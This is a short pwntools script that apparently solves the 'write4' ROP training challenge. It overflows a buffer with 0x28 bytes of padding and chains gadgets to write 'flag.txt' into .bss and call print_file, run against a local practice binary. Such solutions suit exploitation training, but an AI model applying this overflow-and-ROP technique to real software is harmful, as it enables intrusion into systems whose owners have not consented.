from pwn import *

exe = ELF("./write4", checksec=True)

context.binary = exe

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True

def conn():
    return process(exe.path)

def main():
    rop = ROP(exe)
    
    rop.r14 = exe.bss()
    rop.r15 = b"flag.txt"

    rop.raw(exe.symbols.usefulGadgets)
    rop.call(exe.symbols.print_file, [exe.bss()])
    
    r  = conn()
    r.sendline(b"a" * 0x28 + rop.chain())
    r.interactive()

if __name__ == "__main__":
    main()
